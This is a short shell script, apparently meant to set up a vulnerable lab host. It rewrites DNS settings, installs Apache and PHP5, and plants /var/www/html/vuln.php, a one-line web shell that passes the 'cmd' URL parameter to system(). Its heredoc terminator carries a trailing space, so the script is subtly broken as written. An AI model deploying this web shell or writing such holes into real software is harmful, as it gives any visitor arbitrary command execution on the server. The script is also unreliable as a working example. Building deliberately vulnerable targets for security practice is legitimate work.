#!/bin/sh

echo "script start" >> /tmp/result
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf
echo "nameserver 8.8.8.8 8.8.4.4" >> /etc/network/interfaces

apt-get update -y
apt-get install apache2 -y
apt-get install -y php5 libapache2-mod-php5 php5-mcrypt php5-cli

echo "create vuln.php" >> /tmp/result
cat <<EOF > /tmp/vuln.php
<?php
echo system($_GET["cmd"]);
?>
EOF 

echo "cp /tmp/vuln.php /var/www/html/vuln.php" >> /tmp/result
cp /tmp/vuln.php /var/www/html/vuln.php

echo "script end" >> /tmp/result


